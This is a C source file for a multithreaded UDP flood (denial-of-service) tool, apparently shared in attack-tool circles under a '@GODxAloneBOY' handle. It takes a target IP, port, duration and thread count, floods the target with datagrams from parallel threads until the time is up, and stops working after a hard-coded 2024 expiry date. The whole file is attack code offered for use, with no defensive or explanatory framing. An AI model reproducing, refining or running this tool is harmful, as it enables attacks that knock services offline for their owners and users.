#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./jaanu <IP> <PORT> <TIME> <THEARDS> BY @GODxAloneBOY\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    time_t expiration_time; 
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "", 
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                         (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, duration};

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2024 - 1900; 
    expiration_tm.tm_mon = 11; 
    expiration_tm.tm_mday = 31; 
    expiration_tm.tm_hour = 23; 
    expiration_tm.tm_min = 59; 
    expiration_tm.tm_sec = 59; 

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (time(NULL) >= data.expiration_time) {
        printf("Attack has expired. Exiting.\n"); 
        return 0; 
    }

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    printf("Attack finished Made By @username\n");
    return 0;
}